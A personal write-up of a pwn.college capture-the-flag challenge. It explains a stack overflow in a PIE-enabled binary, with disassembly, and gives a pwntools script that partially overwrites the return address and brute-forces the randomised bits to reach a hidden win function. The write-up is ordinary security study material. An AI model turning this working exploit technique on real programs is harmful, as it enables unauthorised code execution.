---
Platform: Pwn College
Tittle: PIEs - Hard
Date & Time: 2026 - 09 - 04 10:20
tags:
  - Challenge
  - ret2shell
  - ShellcodeInjection
---
---
## FLAG : `flag{}`

---
## Solutions

Checking the file security : 
```shell
[*] '/challenge/binary-exploitation-pie-overflow'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

There are no canary, so we could perform an overflow attack. PIE and NX is enabled.

Checking for functions :
```asm
0x0000000000001269  bin_padding
0x00000000000016b5  win_authed
0x00000000000017d2  challenge
0x00000000000018d0  main
```

Let's check for challenge asm code : 
> [!example]- Challenge ASM code
> ```asm
>    0x00000000000017d2 <+0>:	endbr64
   0x00000000000017d6 <+4>:	push   rbp
   0x00000000000017d7 <+5>:	mov    rbp,rsp
   0x00000000000017da <+8>:	sub    rsp,0x90
   0x00000000000017e1 <+15>:	mov    DWORD PTR [rbp-0x74],edi
   0x00000000000017e4 <+18>:	mov    QWORD PTR [rbp-0x80],rsi
   0x00000000000017e8 <+22>:	mov    QWORD PTR [rbp-0x88],rdx
   0x00000000000017ef <+29>:	mov    QWORD PTR [rbp-0x70],0x0
   0x00000000000017f7 <+37>:	mov    QWORD PTR [rbp-0x68],0x0
   0x00000000000017ff <+45>:	mov    QWORD PTR [rbp-0x60],0x0
   0x0000000000001807 <+53>:	mov    QWORD PTR [rbp-0x58],0x0
   0x000000000000180f <+61>:	mov    QWORD PTR [rbp-0x50],0x0
   0x0000000000001817 <+69>:	mov    QWORD PTR [rbp-0x48],0x0
   0x000000000000181f <+77>:	mov    QWORD PTR [rbp-0x40],0x0
   0x0000000000001827 <+85>:	mov    QWORD PTR [rbp-0x38],0x0
   0x000000000000182f <+93>:	mov    QWORD PTR [rbp-0x30],0x0
   0x0000000000001837 <+101>:	mov    QWORD PTR [rbp-0x28],0x0
   0x000000000000183f <+109>:	mov    QWORD PTR [rbp-0x20],0x0
   0x0000000000001847 <+117>:	mov    BYTE PTR [rbp-0x18],0x0
   0x000000000000184b <+121>:	mov    QWORD PTR [rbp-0x8],0x0
   0x0000000000001853 <+129>:	mov    QWORD PTR [rbp-0x8],0x1000
   0x000000000000185b <+137>:	mov    rax,QWORD PTR [rbp-0x8]
   0x000000000000185f <+141>:	mov    rsi,rax
   0x0000000000001862 <+144>:	lea    rdi,[rip+0x8a7]        # 0x2110
   0x0000000000001869 <+151>:	mov    eax,0x0
   0x000000000000186e <+156>:	call   0x1110 <printf@plt>
   0x0000000000001873 <+161>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000001877 <+165>:	lea    rax,[rbp-0x70]
   0x000000000000187b <+169>:	mov    rsi,rax
   0x000000000000187e <+172>:	mov    edi,0x0
   0x0000000000001883 <+177>:	call   0x1130 <read@plt>
   0x0000000000001888 <+182>:	mov    DWORD PTR [rbp-0xc],eax
   0x000000000000188b <+185>:	cmp    DWORD PTR [rbp-0xc],0x0
   0x000000000000188f <+189>:	jns    0x18bd <challenge+235>
   0x0000000000001891 <+191>:	call   0x10e0 <__errno_location@plt>
   0x0000000000001896 <+196>:	mov    eax,DWORD PTR [rax]
   0x0000000000001898 <+198>:	mov    edi,eax
   0x000000000000189a <+200>:	call   0x1170 <strerror@plt>
   0x000000000000189f <+205>:	mov    rsi,rax
   0x00000000000018a2 <+208>:	lea    rdi,[rip+0x88f]        # 0x2138
   0x00000000000018a9 <+215>:	mov    eax,0x0
   0x00000000000018ae <+220>:	call   0x1110 <printf@plt>
   0x00000000000018b3 <+225>:	mov    edi,0x1
   0x00000000000018b8 <+230>:	call   0x1160 <exit@plt>
   0x00000000000018bd <+235>:	lea    rdi,[rip+0x898]        # 0x215c
   0x00000000000018c4 <+242>:	call   0x10f0 <puts@plt>
   0x00000000000018c9 <+247>:	mov    eax,0x0
   0x00000000000018ce <+252>:	leave
   0x00000000000018cf <+253>:	ret
> ```

And also for `win_authed` asm code : 

> [!example]- win_authed ASM Code
> ```asm
> Dump of assembler code for function win_authed:
   0x00000000000016b5 <+0>:	endbr64
   0x00000000000016b9 <+4>:	push   rbp
   0x00000000000016ba <+5>:	mov    rbp,rsp
   0x00000000000016bd <+8>:	sub    rsp,0x10
   0x00000000000016c1 <+12>:	mov    DWORD PTR [rbp-0x4],edi
   0x00000000000016c4 <+15>:	cmp    DWORD PTR [rbp-0x4],0x1337
   0x00000000000016cb <+22>:	jne    0x17cf <win_authed+282>
   0x00000000000016d1 <+28>:	lea    rdi,[rip+0x930]        # 0x2008
   0x00000000000016d8 <+35>:	call   0x10f0 <puts@plt>
   0x00000000000016dd <+40>:	mov    esi,0x0
   0x00000000000016e2 <+45>:	lea    rdi,[rip+0x93b]        # 0x2024
   0x00000000000016e9 <+52>:	mov    eax,0x0
   0x00000000000016ee <+57>:	call   0x1150 <open@plt>
   0x00000000000016f3 <+62>:	mov    DWORD PTR [rip+0x2947],eax        # 0x4040 <flag_fd.5701>
   0x00000000000016f9 <+68>:	mov    eax,DWORD PTR [rip+0x2941]        # 0x4040 <flag_fd.5701>
   0x00000000000016ff <+74>:	test   eax,eax
   0x0000000000001701 <+76>:	jns    0x1750 <win_authed+155>
   0x0000000000001703 <+78>:	call   0x10e0 <__errno_location@plt>
   0x0000000000001708 <+83>:	mov    eax,DWORD PTR [rax]
   0x000000000000170a <+85>:	mov    edi,eax
   0x000000000000170c <+87>:	call   0x1170 <strerror@plt>
   0x0000000000001711 <+92>:	mov    rsi,rax
   0x0000000000001714 <+95>:	lea    rdi,[rip+0x915]        # 0x2030
   0x000000000000171b <+102>:	mov    eax,0x0
   0x0000000000001720 <+107>:	call   0x1110 <printf@plt>
   0x0000000000001725 <+112>:	call   0x1120 <geteuid@plt>
   0x000000000000172a <+117>:	test   eax,eax
   0x000000000000172c <+119>:	je     0x1746 <win_authed+145>
   0x000000000000172e <+121>:	lea    rdi,[rip+0x92b]        # 0x2060
   0x0000000000001735 <+128>:	call   0x10f0 <puts@plt>
   0x000000000000173a <+133>:	lea    rdi,[rip+0x947]        # 0x2088
   0x0000000000001741 <+140>:	call   0x10f0 <puts@plt>
   0x0000000000001746 <+145>:	mov    edi,0xffffffff
   0x000000000000174b <+150>:	call   0x1160 <exit@plt>
   0x0000000000001750 <+155>:	mov    eax,DWORD PTR [rip+0x28ea]        # 0x4040 <flag_fd.5701>
   0x0000000000001756 <+161>:	mov    edx,0x100
   0x000000000000175b <+166>:	lea    rsi,[rip+0x28fe]        # 0x4060 <flag.5700>
   0x0000000000001762 <+173>:	mov    edi,eax
   0x0000000000001764 <+175>:	call   0x1130 <read@plt>
   0x0000000000001769 <+180>:	mov    DWORD PTR [rip+0x29f1],eax        # 0x4160 <flag_length.5702>
   0x000000000000176f <+186>:	mov    eax,DWORD PTR [rip+0x29eb]        # 0x4160 <flag_length.5702>
   0x0000000000001775 <+192>:	test   eax,eax
   0x0000000000001777 <+194>:	jg     0x17a5 <win_authed+240>
   0x0000000000001779 <+196>:	call   0x10e0 <__errno_location@plt>
   0x000000000000177e <+201>:	mov    eax,DWORD PTR [rax]
   0x0000000000001780 <+203>:	mov    edi,eax
   0x0000000000001782 <+205>:	call   0x1170 <strerror@plt>
   0x0000000000001787 <+210>:	mov    rsi,rax
   0x000000000000178a <+213>:	lea    rdi,[rip+0x94f]        # 0x20e0
   0x0000000000001791 <+220>:	mov    eax,0x0
   0x0000000000001796 <+225>:	call   0x1110 <printf@plt>
   0x000000000000179b <+230>:	mov    edi,0xffffffff
   0x00000000000017a0 <+235>:	call   0x1160 <exit@plt>
   0x00000000000017a5 <+240>:	mov    eax,DWORD PTR [rip+0x29b5]        # 0x4160 <flag_length.5702>
   0x00000000000017ab <+246>:	cdqe
   0x00000000000017ad <+248>:	mov    rdx,rax
   0x00000000000017b0 <+251>:	lea    rsi,[rip+0x28a9]        # 0x4060 <flag.5700>
   0x00000000000017b7 <+258>:	mov    edi,0x1
   0x00000000000017bc <+263>:	call   0x1100 <write@plt>
   0x00000000000017c1 <+268>:	lea    rdi,[rip+0x942]        # 0x210a
   0x00000000000017c8 <+275>:	call   0x10f0 <puts@plt>
   0x00000000000017cd <+280>:	jmp    0x17d0 <win_authed+283>
   0x00000000000017cf <+282>:	nop
   0x00000000000017d0 <+283>:	leave
   0x00000000000017d1 <+284>:	ret
End of assembler dump.
> ```

Our task is to perform an overflow attack so we could execute the `win_authed` function.
From the `challenge` function, there is a `read` function with this parameter : 
```c
read(0,$rbp-0x70,0x1000)
```

This mean, our buffer was saved on `$rbp-0x70` and the read could consume up to `0x1000` bytes. So our plan is to modify the `return` address so it will pointing to `win_authed`. Same as previous challenge, the `win` function has a mechanism to check the `edi`, but we could just simply skip it by jumping to `win_authed+28` instead of `+0`.

Now let's try to count the padding between `buffer` and `ret_address` : 
```shell
	buffer = 0x7fff352aa5d0:	0x41414141
	return_address = 0x7fff352aa648:	0x00005f05bd659956
```

Also notice that the address that was saved on `return_address`, the last 12 bits, `956` is a return after `challenge` call on `main` function, we could see that only the last 12 bits was changed (in this instace it looks like 16 bits/2bytes, it was actually coincidence, at second run : `0x7ffca31b0418:	0x00005f9675980956` it has changed to random address)

> [!example]- Start ASM Code
> ```asm
> Dump of assembler code for function main:
   0x00005f05bd6598d0 <+0>:	endbr64
   0x00005f05bd6598d4 <+4>:	push   rbp
   0x00005f05bd6598d5 <+5>:	mov    rbp,rsp
   0x00005f05bd6598d8 <+8>:	sub    rsp,0x1000
   0x00005f05bd6598df <+15>:	or     QWORD PTR [rsp],0x0
   0x00005f05bd6598e4 <+20>:	sub    rsp,0x20
   0x00005f05bd6598e8 <+24>:	mov    DWORD PTR [rbp-0x1004],edi
   0x00005f05bd6598ee <+30>:	mov    QWORD PTR [rbp-0x1010],rsi
   0x00005f05bd6598f5 <+37>:	mov    QWORD PTR [rbp-0x1018],rdx
   0x00005f05bd6598fc <+44>:	mov    rax,QWORD PTR [rip+0x272d]        # 0x5f05bd65c030 <stdin@@GLIBC_2.2.5>
   0x00005f05bd659903 <+51>:	mov    ecx,0x0
   0x00005f05bd659908 <+56>:	mov    edx,0x2
   0x00005f05bd65990d <+61>:	mov    esi,0x0
   0x00005f05bd659912 <+66>:	mov    rdi,rax
   0x00005f05bd659915 <+69>:	call   0x5f05bd659140 <setvbuf@plt>
   0x00005f05bd65991a <+74>:	mov    rax,QWORD PTR [rip+0x26ff]        # 0x5f05bd65c020 <stdout@@GLIBC_2.2.5>
   0x00005f05bd659921 <+81>:	mov    ecx,0x0
   0x00005f05bd659926 <+86>:	mov    edx,0x2
   0x00005f05bd65992b <+91>:	mov    esi,0x0
   0x00005f05bd659930 <+96>:	mov    rdi,rax
   0x00005f05bd659933 <+99>:	call   0x5f05bd659140 <setvbuf@plt>
   0x00005f05bd659938 <+104>:	mov    rdx,QWORD PTR [rbp-0x1018]
   0x00005f05bd65993f <+111>:	mov    rcx,QWORD PTR [rbp-0x1010]
   0x00005f05bd659946 <+118>:	mov    eax,DWORD PTR [rbp-0x1004]
   0x00005f05bd65994c <+124>:	mov    rsi,rcx
   0x00005f05bd65994f <+127>:	mov    edi,eax
   0x00005f05bd659951 <+129>:	call   0x5f05bd6597d2 <challenge>
   0x00005f05bd659956 <+134>:	mov    eax,0x0
   0x00005f05bd65995b <+139>:	leave
   0x00005f05bd65995c <+140>:	ret
> ```

This mean, we could just simply run the code by bruteforcing untill the 12-16 bits hit the actual address, it has 1/16 chance on every run.

Let's build our python script :
```python
from pwn import *
context.log_level = 'critical' #to mute any failed attemp
file = ('/challenge/binary-exploitation-pie-overflow')
start = 0x7fff352aa5d0
end = 0x7fff352aa648

padding = end-start

for i in range (0,30) :
	p = process(file)
	payload = b'A'*padding + b'\xd1\x76' #Don't use p64 (it will add 0 untill 8 bytes)
	write('payload',payload)
	p.send(payload)
	output = p.recvall(timeout=2)
	
	if b'pwn' in output : 
		print(output.decode('utf-8', errors='ignore'))
		break
			
	p.close()
```


---
### Key Takeaways : 
